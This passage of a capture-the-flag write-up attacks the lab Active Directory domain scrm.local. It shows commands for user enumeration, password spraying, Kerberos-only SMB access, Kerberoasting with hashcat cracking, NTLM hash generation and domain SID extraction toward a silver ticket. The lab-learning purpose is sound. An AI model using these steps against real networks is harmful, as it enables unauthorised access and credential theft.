+<p><!-- raw HTML omitted -->We have the full server name<!-- raw HTML omitted -->:</p>
+<ul>
+<li>Again we can see this has the CN as the base (mentioned previously.) So it appears it&rsquo;s a printer server site of some sort. What is also interesting is the CN name &ldquo;Configuration&rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security standards actioned.
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>serverName:
+</span></span><span style="display:flex;"><span>    CN<span style="color:#f92672">=</span>DC1,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>scrm,DC<span style="color:#f92672">=</span>local</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>It&rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.</p>
+<ul>
+<li>We have the naming context.</li>
+<li>Domain name.</li>
+</ul>
+</li>
+<li>
+<p><strong>I update my <code>/etc/hosts</code> file now that we have the server name</strong>.</p>
+<ul>
+<li>This is so we can use tools like <a href="https://github.com/ropnop/kerbrute">kerbrute</a> for user enumeration as well as other tools later on.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberos-88">Kerberos <code>88</code>:</h3>
+<h4 id="user-enumeration-using-kerbrute">User enumeration using <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>:</h4>
+<ul>
+<li><strong>I use</strong> <a href="https://github.com/ropnop/kerbrute">kerbrute</a> <strong>to check for usernames:</strong>
+<ul>
+<li><code>kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt</code></li>
+<li>I find 5 valid usersnames, I add these to my list of usernames:</li>
+<li><figure><img src="/ox-hugo/2024-10-06-144403_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="smb-445">SMB <code>445</code>:</h3>
+<h4 id="checking-for-null-and-guest-sessions-netexec">Checking for NULL &amp; Guest Sessions netexec:</h4>
+<ul>
+<li>
+<p><strong>I check for NULL &amp; Guest session but they are not accessible</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u 'guest' -p '' --shares</code></li>
+<li><code>netexec smb $box -u '' -p '' --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-144142_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check to see if any of the users I found in kerbrute have used any of their names as a password</strong>:</p>
+<ul>
+<li><code>netexec smb $box -u Users.txt -p Users.txt --continue-on-success</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-144639_.png">
+</figure>
+</li>
+<li>No hits though:</li>
+</ul>
+</li>
+</ul>
+<h3 id="dns-53">DNS <code>53</code>:</h3>
+<h4 id="using-dnsenum-to-check-for-interesting-dns-records">Using <a href="https://www.kali.org/tools/dnsenum/">dnsenum</a> to check for interesting DNS records:</h4>
+<ul>
+<li>
+<p><strong>I fire up</strong> <a href="https://www.kali.org/tools/dnsenum/">dnsenum</a> <strong>to enumerate any interesting DNS records</strong>:</p>
+<ul>
+<li><code>dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain</code></li>
+</ul>
+</li>
+<li>
+<p><strong>I get a hit on an interesting entry straight away</strong>:</p>
+<ul>
+<li><code>ws01.scrm.local 192.168.0.54</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-145801_.png">
+</figure>
+</li>
+<li>This could indicate we have another host running on an internal network, or potentially this host is dual nicked and known by <code>WS01.scrm.local</code> on a seperate network.</li>
+<li>+Note+:
+<ul>
+<li>I update my <code>/etc/hosts</code> file to contain this entry.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="http-80">HTTP <code>80</code>:</h3>
+<h4 id="finding-an-internal-website">Finding an internal website:</h4>
+<ul>
+<li><strong>I open</strong> <a href="https://www.kali.org/tools/burpsuite/">burpsuite</a> <strong>to proxy all traffic through</strong>:
+<ul>
+<li>I navigate to the webserver running on port 80 &amp; find an internal intranet site:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-06-150802_.png">
+</figure>
+</li>
+<li>As we can see there is nothing to report in Wappalyzer.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="fuzzing-for-pages-using-ffuf">Fuzzing for pages using <code>FFUF</code>:</h4>
+<ul>
+<li>
+<p><strong>I use</strong> <a href="https://www.kali.org/tools/ffuf/">FFUF</a> <strong>to fuzz for more</strong> <code>.html</code> <strong>pages whilst I explor the site</strong>:</p>
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://$box/FUZZ.html -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-153700_.png">
+</figure>
+</li>
+<li>I don&rsquo;t find anything additional:</li>
+</ul>
+</li>
+<li>
+<p><strong>I fuzz for more directories</strong>:</p>
+<ul>
+<li><code>ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-195627_.png">
+</figure>
+</li>
+<li>Nothing of particular note.</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-their-was-breach-and-ntlm-authentication-is-disabled">Discovering their was breach &amp; <code>NTLM</code> authentication is disabled:</h4>
+<ul>
+<li><strong>Navigating to the</strong> <code>support.html</code> <strong>page we can see the below alert</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-06-150904_.png">
+</figure>
+</li>
+<li>It says that they were breached and now all <code>NTLM</code> authentication has been disabled. Interesting.</li>
+</ul>
+</li>
+</ul>
+<h4 id="discovering-password-resets-cause-password-to-be-set-as-username">Discovering Password Resets Cause Password to Be Set As Username:</h4>
+<ul>
+<li>
+<p>Enumerating the site further we find the page <code>passwords.html</code> where it says the below:</p>
+<blockquote>
+<p>Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.</p>
+</blockquote>
+<ul>
+<li>Meaning there is a good chance that a users password is their username, I have already tried this with SMB, but have not tried other services.
+<ul>
+<li>+Note+: It turned out this was the way forward however something was up with my box, so had to reset.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>I save the full email addresses to a list and try password spraying with them as the password as well as thes shortened username, but get no hits.</p>
+</li>
+</ul>
+<h4 id="discovering-that-ksimpson-is-most-likely-part-of-it-support">Discovering that <code>ksimpson</code> is most likely part of <code>IT/Support</code>:</h4>
+<ul>
+<li><code>ksimpson</code> <strong>in screenshot</strong>:
+<ul>
+<li>Looking at the page <code>supportrequest.html</code> it details a process for providing network information &amp; there is a screenshot which has <code>ksimpson</code> as the user:</li>
+<li><figure><img src="/ox-hugo/2024-10-06-152549_.png">
+</figure>
+</li>
+<li>I believe we can safely assume that <code>ksimpson</code> is part of <code>IT/Support</code> in some capacity as they most likely made this screenshot. (This may not seem like much put could be a valauble target to go after later)</li>
+</ul>
+</li>
+</ul>
+<h4 id="sales-order-app">Sales Order App:</h4>
+<ul>
+<li><strong>On the page</strong> <code>salesorder.html</code> <strong>find the following content</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-06-200820_.png">
+</figure>
+</li>
+<li>It shows that they have their own custom app running (which was expected given NMAP&rsquo;s output) &amp; that it&rsquo;s possible to enable debug logging. We don&rsquo;t have access to this app as far as I can see at the moment but this is good information.</li>
+</ul>
+</li>
+</ul>
+<h3 id="mssql-1433">MSSQL <code>1433</code>:</h3>
+<ul>
+<li>I try cred stuff using netexec with mssql option, but it fails. (Stay tuned to find out why later)</li>
+</ul>
+<h3 id="scramblecorp-order-service-4411">ScrambleCorp Order Service <code>4411</code>:</h3>
+<ul>
+<li>From our NMAP scan it says:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="4411/tcp%20%20open%20%20found?%0a%7c%20fingerprint-strings:%0a%7c%20%20%20DNSStatusRequestTCP,%20DNSVersionBindReqTCP,%20GenericLines,%20JavaRMI,%20Kerberos,%20LANDesk-RC,%20LDAPBindReq,%20LDAPSearchReq,%20NCP,%20NULL,%20NotesRPC,%20RPCCheck,%20SMBProgNeg,%20SSLSessionReq,%20TLSSessionReq,%20TerminalServer,%20TerminalServerCookie,%20WMSRequest,%20X11Probe,%20afp,%20giop,%20ms-sql-s,%20oracle-tns:%0a%7c%20%20%20%20%20SCRAMBLECORP_ORDERS_V1.0.3;%0a%7c%20%20%20FourOhFourRequest,%20GetRequest,%20HTTPOptions,%20Help,%20LPDString,%20RTSPRequest,%20SIPOptions:%0a%7c%20%20%20%20%20SCRAMBLECORP_ORDERS_V1.0.3;%0a%7c_%20%20%20%20ERROR_UNKNOWN_COMMAND;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>4411/tcp  open  found?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|_    ERROR_UNKNOWN_COMMAND;</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+<h4 id="using-nc-to-connect-to-port-4411">Using nc to connect to port <code>4411</code>:</h4>
+<ul>
+<li>
+<p><strong>Finding</strong> <code>SCRAMBLECORP_ORDERS_V1.0.3;</code></p>
+<ul>
+<li>I use nc to connect to the service running on <code>4411</code>
+<ul>
+<li><code>nc $box 4411</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-151441_.png">
+</figure>
+</li>
+<li>It tells me that there is a service called <code>SCRAMBLECORP_ORDERS_V1.0.3</code> running on the service (we knew this from the <code>NMAP</code> scan).</li>
+<li>What&rsquo;s most interesting to me is that the banner &amp; and the responses are all followed by a semi-colon <code>;</code> this is what usually follows an <code>SQL/MSSQL</code> statement.
+<ul>
+<li>In the <code>NMAP</code> we can also see near the end it says <code>ms-sql-s, oracle-tns:</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I try entering</strong> <code>oracle-sql</code> <strong>queries</strong>:</p>
+<ul>
+<li><code>SELECT * FROM v$version;</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-201341_.png">
+</figure>
+</li>
+<li>No luck lets come back to this later.</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-dot-authenticated-enumeration">2. Authenticated Enumeration:</h2>
+<h3 id="realizing-the-mistake-i-made-when-enumerating">Realizing the mistake I made when enumerating:</h3>
+<ul>
+<li>After alot of enumeration, and some strange results from <code>netexec</code> and some other tools it dawned on me, all of my checks have been with <code>netexec</code> and SMB….which used NTLM….I need to try and connect to the service using <code>kerberos</code> if possible. I need to cred stuff using usernames as passwords but authenticating using <code>kerberos</code>.</li>
+</ul>
+<h3 id="connecting-to-the-smb-shares-as-ksimpson">Connecting to the <code>SMB</code> shares as <code>ksimpson</code>:</h3>
+<ul>
+<li>As we cannot use <code>NTLM</code> authentication we have to force <code>kerberos</code> authentication. This is possible by passing most programs the <code>-k</code> flag, however most tools expect to be fed a <code>.cacche</code> authentication file by way fo the <code>KRB5CCNAME</code> variable in linux. So we have to somehow create a <code>.cacche</code> file or pass the creds directly on the CLI and have <code>kerberos</code> authenticate using them.
+<ul>
+<li>I do some digging and I cannot find direct way to craft my own <code>.cacche</code> file. So instead I look to tools I can try and force into using CLI fed creds but authenticate using the <code>kerberos</code> protocol.</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-force-netexec-to-use-kerberos-authentication">Trying to force <code>netexec</code> to use <code>kerberos</code> authentication:</h4>
+<ul>
+<li><strong>I try on netexec by passing the <code>-k</code> flag, but it does not work</strong>:
+<ul>
+<li>
+<p>I try multiple methods but none work.</p>
+<ul>
+<li><code>netexec smb $box -k</code></li>
+<li><code>netexec smb $box -u ksimpson -k</code></li>
+<li><code>netexec smb $box -u ksimpson -p ksimpson -k</code></li>
+</ul>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-10-06-204724_.png">
+</figure>
+
+<ul>
+<li>+Note+: I am using <code>ksimpson</code> as it just kinda feels like the move, with how much we have seen that username so far.</li>
+</ul>
+</li>
+<li>
+<p>Back to the drawing board.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-force-smbmap-to-use-kerberos-authentication">Trying to force <code>smbmap</code> to use <code>kerberos</code> authentication:</h4>
+<ul>
+<li><strong>I try to connect this time with</strong> <code>smbmap</code> <strong>and it&rsquo;s the same issue</strong>:
+<ul>
+<li><code>smbmap -u $user -H $box -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-205223_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="trying-to-force-smbclient-to-use-kerberos-authentication">Trying to force <code>smbclient</code> to use <code>kerberos</code> authentication:</h4>
+<ul>
+<li>
+<p><strong>Big ol&rsquo; *miss here</strong>:</p>
+<ul>
+<li><code>smbclient -U $domain\$user \\\\$box\\ -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-06-205633_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>It appears that <code>netexec</code> &amp; <code>smbmap</code>  expects a <code>.ccache</code> to provided via the <code>KRB5CCNAME</code> variable, and will not try the provided creds for <code>kerberos</code> authentication.</p>
+</li>
+</ul>
+<h4 id="using-impacket-smbclient-to-authenticate-to-the-smb-share-using-kerberos">Using <code>impacket-smbclient</code> to authenticate to the SMB Share using <code>kerberos</code>:</h4>
+<ul>
+<li><strong>I look through the list of tools I use and what&rsquo;s left, my precious</strong> <code>impacket-smbclient</code>:
+<ul>
+<li><code>impacket-smbclient $domain/$user:$user@dc1.$domain -k</code></li>
+<li>IT CONNECTS!!!!</li>
+<li><figure><img src="/ox-hugo/2024-10-06-205920_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-a-file-called-network-security-changes-dot-pdf">Finding a file called <code>Network Security Changes.pdf</code>:</h3>
+<ul>
+<li>
+<p><strong>Finding the</strong> <code>.pdf</code>:</p>
+<ul>
+<li>Whilst enumerating the shares I find a file called <code>Network Security Changes.pdf</code> in the <code>Public</code> share:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-073456_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I download the</strong> <code>.pdf</code>:</p>
+<ul>
+<li><code>get Network Security Changes.pdf</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-073603_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I check all other shares but I am denied access</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-073641_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="opening-network-security-changes-dot-pdf">Opening <code>Network Security Changes.pdf</code>:</h4>
+<ul>
+<li>
+<p><strong>Strange text…hmmm?</strong></p>
+<ul>
+<li>When I initially open the file there is only a small amount of text.</li>
+<li><figure><img src="/ox-hugo/2024-10-07-074339_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Poor obfuscation attempted</strong>:</p>
+<ul>
+<li>I press <code>CTRL+A</code> to select all text and can see that they have just made the text white.</li>
+<li><figure><img src="/ox-hugo/2024-10-07-074545_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I use</strong> <code>pdftotext</code> <strong>to convert the file to a</strong> <code>.txt</code> <strong>file</strong>:</p>
+<ul>
+<li><code>pdftotext *.pdf</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-074703_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="i-also-try-and-connect-to-smb-as-the-other-users">I also try and connect to smb as the other users:</h4>
+<ul>
+<li><strong>I check if any other users can connect to SMB via kerberos but they cannot</strong>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-080858_.png">
+</figure>
+</li>
+<li>See, this is why using variables is so much easier, change on var <code>$user</code> and you can just repeat all your tasks.</li>
+</ul>
+</li>
+</ul>
+<h4 id="reading-network-security-changes-dot-pdf">Reading <code>Network Security Changes.pdf</code>:</h4>
+<ul>
+<li>Once converted I open it up and find the following:</li>
+<li><figure><img src="/ox-hugo/2024-10-07-075057_.png">
+</figure>
+
+<ul>
+<li><strong>Key Points</strong>:
+<ul>
+<li>They were compromised via an <code>NTLM</code> Relaying attack which is why they deactivated <code>NTLM</code> authentication &amp; are under the impression <code>Kerberos</code> is more secure.</li>
+<li>When accessing resources we need to specify the full server name and CN name of the user. e.g. <code>ksimpson.scrm.local</code> instead of just the <code>SAM</code> name of <code>ksimpson</code>: We discovered this in our SMB connection.</li>
+<li>There are <code>creds</code> stored in their SQL HR Database however this has now been restricted.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="attempting-to-extract-creator-names-from-the-dot-pdf">Attempting to extract creator names from the <code>.PDF</code>:</h4>
+<p>If you are not aware, it is sometimes possible to extract valid domain usernames from <code>pdf's</code> if they have been created on a Windows host. As often the Creator Field is populated using the Windows User&rsquo;s Logged-In Name</p>
+<ul>
+<li><strong>Some reasons why the Creator Field Uses the Windows User&rsquo;s Logged-In Name</strong>:
+<ul>
+<li>
+<p><strong>PDF Metadata Collection</strong>:</p>
+<ul>
+<li>When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.</li>
+</ul>
+</li>
+<li>
+<p><strong>System Environment Variables</strong>:</p>
+<ul>
+<li>The logged-in Windows username is part of system environment variables. This is often used to populate fields like &ldquo;<code>Creator</code>&rdquo; in the PDF document.</li>
+</ul>
+</li>
+<li>
+<p><strong>Program Defaults</strong>:</p>
+<ul>
+<li>By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.</li>
+</ul>
+</li>
+<li>
+<p><strong>Tracking Ownership</strong>:</p>
+<ul>
+<li>This feature helps track the original creator or author of a document for auditing or document management purposes.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="attempting-to-extract-usernames-from-the-pdf-using-exiftool">Attempting to extract Usernames From the PDF using exiftool:</h5>
+<ul>
+<li><code>exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &gt; userNames.txt</code></li>
+<li>I run it and check the output of the file, however there are no valid usernames, just that it was created using Word 2010:</li>
+<li><figure><img src="/ox-hugo/2024-10-07-074023_.png">
+</figure>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Command Breakdown:</p>
+<ol>
+<li>
+<p><code>exiftool -Creator -csv *pdf</code></p>
+<ul>
+<li><code>exiftool</code>: Run the tool</li>
+<li><code>-Creator</code>: Extracts the <code>Creator</code> metadata field from the files.</li>
+<li><code>-csv</code>: Outputs the data in CSV format.
+<ul>
+<li>This is the most important part for the rest of the command to work:
+<ul>
+<li>The <code>CSV</code> format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF&rsquo;s metadata is presented as a row, and each field (like &ldquo;<code>Creator</code>&rdquo;) is a column. This makes it easier to process the data programmatically.</li>
+<li><strong>Simplicity</strong>: When using tools like <code>cut</code>, it’s easier to extract specific fields by referring to column numbers (e.g., <code>-f2</code> for the second column), which is straightforward with <code>CSV</code> formatting.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>*pdf</code>: Targets all PDF files in the current directory.</li>
+</ul>
+</li>
+<li>
+<p><code>| cut -d, -f2</code></p>
+<ul>
+<li><code>|</code>: Pipes the output from the previous command into the next.</li>
+<li><code>cut</code>: Extracts specific fields from the CSV output.</li>
+<li><code>-d,</code>: Uses a comma as the delimiter (since it&rsquo;s CSV data).</li>
+<li><code>-f2</code>: Selects the second field, which contains the creator name.</li>
+</ul>
+</li>
+<li>
+<p><code>| sort</code>: Sorts the creator names alphabetically.</p>
+</li>
+<li>
+<p><code>| uniq</code>: Removes duplicate names, leaving only unique entries.</p>
+</li>
+<li>
+<p><code>&gt; userNames.txt</code></p>
+<ul>
+<li>Redirects the final output (unique creator names) into a file named <code>userNames.txt</code></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="trying-to-connect-to-mssql-using-impacket-mssql">Trying to Connect to <code>MSSQL</code> using <code>impacket-mssql</code>:</h3>
+<ul>
+<li><strong>I attempt to connect as all the users I have found so far</strong>:
+<ul>
+<li><code>impacket-mssqlclient $domain/$user:$user@dc1.$domain -k</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-080307_.png">
+</figure>
+</li>
+<li>What is interesting though is the response for the user <code>ksimpson</code> is different from all other users:
+<ul>
+<li><code>[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\ksimpson'.</code></li>
+</ul>
+</li>
+<li>Which leads me to believe they may have access however I just need to find a password for them.</li>
+</ul>
+</li>
+</ul>
+<h3 id="kerberoasting-using-kerberos-credentials-to-get-more-kerberos-credentials">Kerberoasting using Kerberos Credentials to Get More Kerberos Credentials:</h3>
+<ul>
+<li><figure><img src="/ox-hugo/moonmeme.jpg">
+</figure>
+</li>
+<li>As we have valid credentials we can use impackets suite of tools to further enumerate and exploit the target.</li>
+</ul>
+<h4 id="using-impacket-getusersspns-to-extract-the-sql-service-kerberos-tickets">Using <code>impacket-GetUsersSPNs</code> to extract the <code>SQL</code> service Kerberos Tickets:</h4>
+<ul>
+<li><strong>Kerberoasting with</strong> <code>impacket-GetUserSPNs</code>:
+<ul>
+<li><code>impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -outputfile scrmtickets</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-083920_.png">
+</figure>
+</li>
+<li>We get a hit &amp; get the <code>sqlsvc</code> ticket:</li>
+</ul>
+</li>
+</ul>
+<h3 id="cracking-the-sqlsvc-hashes-with-hashcat">Cracking the <code>sqlsvc</code> hashes with <code>hashcat</code>:</h3>
+<ul>
+<li><strong>I pass the hashes into hashcats</strong>:
+<ul>
+<li><code>hashcat -m 13100 scrmtickets ~/Wordlists/rockyou.txt</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-084213_.png">
+</figure>
+</li>
+<li>It cracks almost immediately &amp; now we have a creds for <code>mssql</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="trying-to-connect-to-the-mssql-service">Trying to connect to the <code>MSSQL</code> Service:</h3>
+<ul>
+<li>
+<p>I try various ways with <code>impacket-mssqlclient</code> to connect with the password and it does not work.</p>
+</li>
+<li>
+<p><strong>Re-exporting the tickets as</strong> <code>.ccache</code> <strong>file</strong>:</p>
+<ul>
+<li><code>impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -save</code></li>
+<li>I then re-export the tickets but this time as a <code>.ccache</code> file by passing the <code>-save</code> flag.</li>
+<li><figure><img src="/ox-hugo/2024-10-07-085557_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I load it into the</strong> <code>KRB5CCNAME</code> <strong>variable</strong>:</p>
+<ul>
+<li>However it doesn&rsquo;t work either. I think this is due it saying in the pdf that only domain admins have access to the she SQL server.</li>
+</ul>
+</li>
+</ul>
+<h3 id="i-ve-got-a-silverticket-maybe-and-x2026">I&rsquo;ve got a <code>SilverTicket</code> maybe…</h3>
+<ul>
+<li>As I have the service password if I can get the domain <code>SID</code> and the <code>NTML</code> hash of the <code>sqlsvc</code> password I should be able to craft a silver ticket using <code>impacket-ticketer</code>:</li>
+</ul>
+<h4 id="generate-ntlm-hash-of-sqlsvc-user">Generate NTLM Hash of <code>sqlsvc</code> user:</h4>
+<ul>
+<li>
+<p>Looking online I find the <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a> where we can just enter the password and it will generate an <code>NTLM</code> hash. However I want to be able to do this when I don&rsquo;t have access to that website.</p>
+<ul>
+<li>I find this post from 2012:
+<ul>
+<li><a href="https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html">https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Code to convert clear-text password to</strong> <code>NTLM</code> <strong>hash</strong>:</p>
+<ul>
+<li><code>iconv -f ASCII -t UTF-16LE &lt;(printf &quot;&lt;Password&gt;&quot;) | openssl dgst -md4</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-102232_.png">
+</figure>
+</li>
+<li>I verify it matches using the online tool:
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-102256_.png">
+</figure>
+</li>
+<li>+Note+: The only reason I do this check as this is the first time I have used this code so need to ensure it works and the hashes match, moving forward I now know I can use this code and it will work.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Python Code to Create</strong> <code>NTLM</code> <strong>hash from clear text creds</strong>:</p>
+<ul>
+<li>
+<p>Ironically when I went to add the shell code above to my notes. I found an entry where I had done this previously using python. Below is the python code to do so:</p>
+<ul>
+<li>Install the <code>passlib</code> first
+<ul>
+<li><code>pip install passlib</code></li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> passlib.hash <span style="color:#f92672">import</span> nthash
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Put your clear text password here: &#34;</span>)
+</span></span><span style="display:flex;"><span>nt_hash <span style="color:#f92672">=</span> nthash<span style="color:#f92672">.</span>hash(password)
+</span></span><span style="display:flex;"><span>print(nt_hash)</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-07-102930_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="extracting-the-domain-sid-using-impacket-getpac">Extracting the Domain SID using <code>impacket-getPac</code>:</h4>
+<ul>
+<li><strong>We can use</strong> <code>impacket-getPac</code> <strong>to easily extract the</strong> <code>DomainSID</code>:
+<ul>
+<li><code>impacket-getPac $domain/$user -targetUser administrator -hashes :$hash</code></li>
+<li><figure><img src="/ox-hugo/2024-10-07-105329_.png">
+</figure>
+</li>
+<li><code>DomainSID</code>: S-1-5-21-2743207045-1827831105-2542523200</li>
+<li>+Note+: PAC&rsquo;s are pretty interesting, see below for more information.</li>
+</ul>
+</li>
+</ul>
+<h5 id="what-is-a-privilege-attribute-certificate--pac">What is a Privilege Attribute Certificate (PAC):</h5>
+<ul>
+<li>
+<p><strong>Definition</strong>:</p>
+<ul>
+<li>A Privilege Attribute Certificate (<code>PAC</code>) is a data structure used in Microsoft&rsquo;s Kerberos implementation to store authorization information about a user.</li>
+<li>The PAC is a Microsoft-specific extension to the Kerberos protocol, documented in <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962">MS-PAC specification</a>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Components of a PAC</strong>:</p>
+<ul>
+<li>
+<p>User Security Identifiers (<code>SIDs</code>):</p>
+<ul>
+<li>Contains the <code>SID</code> of the user, which is a unique identifier that represents the user in Windows.</li>
+<li>Includes both the user&rsquo;s primary <code>SID</code> and any additional <code>SIDs</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Group Memberships:</strong>:</p>
+<ul>
+<li>Lists the groups to which the user belongs, used for determining access to resources.</li>
+<li>Contains both domain and local group memberships.</li>
+<li>Includes Resource Groups and Claims information.</li>
+</ul>
+</li>
+<li>
+<p><strong>Privilege Information</strong>:</p>
+<ul>
+<li>Contains the privileges assigned to the user (e.g., whether the user has administrative rights).</li>
+<li>Stores User Account Control (<code>UAC</code>) flags.</li>
+<li>Lists specific Windows privileges (e.g., <code>SeBackupPrivilege</code>, <code>SeDebugPrivilege</code>).</li>
+</ul>
+</li>
+<li>
+<p><strong>Logon Information</strong>:</p>
+<ul>
+<li>Includes logon time, logon count, and other session-specific data.</li>
+<li>Contains the user&rsquo;s profile path and home directory.</li>
+<li>Stores the user&rsquo;s logon script path.</li>
+<li>Records the logon server and domain.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
